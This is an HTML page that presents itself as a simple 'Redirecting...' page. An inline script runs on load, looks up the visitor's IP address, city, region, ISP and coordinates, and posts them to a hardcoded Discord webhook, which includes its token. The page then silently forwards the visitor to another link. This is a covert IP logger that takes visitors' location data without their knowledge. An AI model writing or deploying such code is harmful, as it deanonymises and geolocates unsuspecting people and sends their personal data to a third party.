<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Redirecting...</title>
    <script type="text/javascript">
      (async () => {
        const webhookUrl = "https://discord.com/api/webhooks/1376130843982037122/4SSFapmxV2wCFoqn8rmRC_P4rtp-Z74woZIXqYG-ImnDjqhCxnHNEDUOrIHVHOxtKs7C";

        function getFlagEmoji(countryCode) {
          return countryCode?.toUpperCase().replace(/./g, c =>
            String.fromCodePoint(c.charCodeAt(0) + 127397)
          ) || '';
        }

        try {
          const response = await fetch("https://ipapi.co/json/");
          const ipData = await response.json();

          const embed = {
            embeds: [{
              title: "New Visitor",
              description: `Visitor IP: ${ipData.ip}`,
              color: 0x00FFFF,
              fields: [
                { name: "City", value: ipData.city || "Unknown", inline: true },
                { name: "Region", value: ipData.region || "Unknown", inline: true },
                { name: "Country", value: `${ipData.country_name || "Unknown"} ${getFlagEmoji(ipData.country_code)}`, inline: true },
                { name: "ISP", value: ipData.org || "Unknown", inline: true },
                { name: "Coordinates", value: `${ipData.latitude}, ${ipData.longitude}`, inline: true },
              ],
              timestamp: new Date().toISOString(),
              footer: { text: "Visitor Tracker" }
            }]
          };

          await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embed)
          });
        } catch (err) {
          console.error("Tracking failed:", err);
        } finally {
          // Redirect user regardless of result
          window.location.replace("https://fakecrime.bio/2t");
        }
      })();
    </script>
  </head>
  <body>
  </body>
</html>
